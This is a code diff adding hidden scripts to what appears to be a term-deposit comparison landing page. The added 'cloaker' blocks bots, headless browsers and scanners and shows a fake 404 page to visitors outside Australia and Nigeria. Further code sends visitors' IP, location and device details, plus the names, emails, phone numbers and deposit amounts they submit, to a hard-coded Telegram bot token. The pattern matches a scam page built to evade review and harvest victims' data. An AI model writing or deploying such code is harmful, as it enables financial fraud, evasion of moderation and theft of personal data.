@@ -496,7 +496,106 @@ footer{background:var(--ink);padding:64px 48px 40px}
 }
 </style>
 </head>
-<body>
+<body style="visibility:hidden">
+<script>
+
+// ── CLOAKER ──────────────────────────────────────────────────────────────────
+const ALLOWED = ['AU', 'NG']; // ← edit countries here
+
+(async () => {
+  // 1. Bot / headless check
+  const ua = navigator.userAgent || '';
+  const BAD_UA = [
+    /bot/i,/crawl/i,/spider/i,/slurp/i,/scrape/i,
+    /facebookexternalhit/i,/twitterbot/i,/linkedinbot/i,
+    /applebot/i,/headlesschrome/i,/phantomjs/i,/selenium/i,
+    /puppeteer/i,/playwright/i,/python/i,/curl/i,/wget/i,
+    /ahrefsbot/i,/semrushbot/i,/gptbot/i,/ccbot/i,/claudebot/i,
+    /bytespider/i,/go-http-client/i,/java\//i,/okhttp/i,/scrapy/i,
+  ];
+  if (!ua || ua.length < 20)           { block(); return; }
+  if (BAD_UA.some(p => p.test(ua)))    { block(); return; }
+  if (navigator.webdriver)             { block(); return; }
+  if (!navigator.language)             { block(); return; }
+  if ((navigator.languages||[]).length === 0) { block(); return; }
+  if (/chrome/i.test(ua) && !window.chrome)   { block(); return; }
+  if (screen.width === 0 || screen.height === 0) { block(); return; }
+
+  // 2. Geo check — try 3 APIs, first success wins
+  // Only block VPN if ALL checks agree — prevents false positives on mobile carriers
+  let cc = null;
+  let vpnFlagged = false;
+
+  // API 1 — Cloudflare trace (most reliable, never rate limits, no VPN detection)
+  try {
+    const txt = await fetch('https://www.cloudflare.com/cdn-cgi/trace', { signal: AbortSignal.timeout(5000) }).then(r => r.text());
+    cc = txt.match(/loc=(\w+)/)?.[1] || null;
+  } catch {}
+
+  // API 2 — ipwho.is (fallback, also checks VPN type)
+  if (!cc) {
+    try {
+      const d = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) }).then(r => r.json());
+      if (d.success) {
+        cc = d.country_code;
+        // Only flag VPN if type is explicitly bad AND not a common mobile/ISP type
+        const badType = ['vpn','proxy','tor'];
+        if (badType.includes(d.type)) vpnFlagged = true;
+      }
+    } catch {}
+  }
+
+  // API 3 — ipapi.co (last resort)
+  if (!cc) {
+    try {
+      const d = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) }).then(r => r.json());
+      if (!d.error) cc = d.country_code;
+    } catch {}
+  }
+
+  // No country detected at all — show page (fail open so real users aren't blocked)
+  if (!cc) { show(); return; }
+
+  // Wrong country — block
+  if (!ALLOWED.includes(cc)) { block(); return; }
+
+  // VPN flagged AND wrong country — block (but if country is allowed, let through)
+  // This prevents Nigerian mobile carriers being falsely flagged
+  if (vpnFlagged && !ALLOWED.includes(cc)) { block(); return; }
+
+  // All good — show page
+  show();
+})();
+
+function show() { document.body.style.visibility = 'visible'; logVisitor(); }
+
+async function logVisitor() {
+  try {
+    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+    const d = await r.json();
+    const msg =
+      `👁️ <b>New Visitor</b>\n` +
+      `🌐 IP: ${d.ip || 'unknown'}\n` +
+      `📍 Location: ${d.city || '?'}${d.region ? ', ' + d.region : ''}, ${d.country_name || '?'}\n` +
+      `🏢 ISP: ${d.org || 'unknown'}\n` +
+      `📱 Device: ${/mobile|android|iphone|ipad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}\n` +
+      `🖥️ Browser: ${navigator.userAgent.match(/(chrome|safari|firefox|edge|opera)/i)?.[0] || 'unknown'}\n` +
+      `🔗 Ref: ${document.referrer || 'Direct'}\n` +
+      `🕐 Time: ${new Date().toLocaleString('en-AU', { timeZone: 'Australia/Sydney' })}`;
+    await tgNotify(msg);
+  } catch(e) { console.warn('Visitor log:', e); }
+}
+function block() {
+  document.documentElement.innerHTML =
+    '<!DOCTYPE html><html><head><title>404 Not Found</title>' +
+    '<style>body{font-family:monospace;background:#fff;color:#333;' +
+    'display:flex;align-items:center;justify-content:center;height:100vh;margin:0}' +
+    'p{font-size:14px;opacity:.5}</style></head>' +
+    '<body><p>404 Not Found</p></body></html>';
+}
+// ── END CLOAKER ───────────────────────────────────────────────────────────────
+
+</script>
 
 <!-- NAV -->
 <nav class="nav" id="nav">
@@ -1013,10 +1112,76 @@ async function submitLead(btn){
 
   if(typeof fbq!=='undefined')fbq('track','Lead',{content_name:'Term Deposit Comparison',content_category:'Finance',currency:'AUD'});
 
+  // Telegram lead notification
+  await tgNotify(
+    `🎯 <b>NEW LEAD</b>\n` +
+    `👤 Name: ${data.Name}\n` +
+    `📧 Email: ${data.Email}\n` +
+    `📱 Phone: ${data.Phone}\n` +
+    `📍 City: ${data.City}\n` +
+    `💰 Amount: ${data.Amount}\n` +
+    `⏰ When: ${data.When}\n` +
+    `🕐 Time: ${data['Submitted At']}`
+  );
+
   document.getElementById('lf-fields').style.display='none';
   btn.style.display='none';
   document.getElementById('lf-success').style.display='block';
 }
+
+// ── TELEGRAM NOTIFICATIONS ───────────────────────────────────────────────────
+const TG_TOKEN = '7573046283:AAFlBiudcSO2CpbBCT1JG3WHV6ErnNl5BiM';
+const TG_CHAT  = '-1003835553484';
+
+async function tgNotify(msg) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' }),
+    });
+  } catch(e) { console.warn('TG error:', e); }
+}
+
+// Track all button/link clicks on page load
+document.addEventListener('DOMContentLoaded', () => {
+
+  // CTA buttons — Compare Rates, Speak to adviser, Get Started nav
+  document.querySelectorAll('.cta-primary, .cta-ghost, .nav-btn').forEach(el => {
+    el.addEventListener('click', () => {
+      tgNotify(`🖱️ <b>Button Click</b>\n📌 Label: ${el.textContent.trim()}\n🌐 Page: ${location.href}`);
+    });
+  });
+
+  // Rate card apply links
+  document.querySelectorAll('.rate-apply, .slim-apply').forEach(el => {
+    el.addEventListener('click', () => {
+      const card = el.closest('.rate-card, tr');
+      const bank = card?.querySelector('.rate-bank, .slim-bank')?.textContent.trim() || 'Unknown';
+      const rate = card?.querySelector('.rate-num, .slim-rate')?.textContent.trim() || '';
+      tgNotify(`💰 <b>Apply Click</b>\n🏦 Bank: ${bank}\n📈 Rate: ${rate}\n🌐 Page: ${location.href}`);
+    });
+  });
+
+  // Guide / article cards
+  document.querySelectorAll('.guide-card').forEach(el => {
+    el.addEventListener('click', () => {
+      const title = el.querySelector('.guide-title')?.textContent.trim() || 'Unknown';
+      tgNotify(`📰 <b>Guide Click</b>\n📖 Title: ${title.substring(0,80)}\n🌐 Page: ${location.href}`);
+    });
+  });
+
+  // Newsletter alert button
+  document.querySelectorAll('.nl-form button').forEach(el => {
+    el.addEventListener('click', () => {
+      const email = el.previousElementSibling?.value || '';
+      tgNotify(`📧 <b>Rate Alert Signup</b>\n📩 Email: ${email || 'not entered'}\n🌐 Page: ${location.href}`);
+    });
+  });
+
+});
+// ── END TELEGRAM ─────────────────────────────────────────────────────────────
+
 </script>
 </body>
 </html>
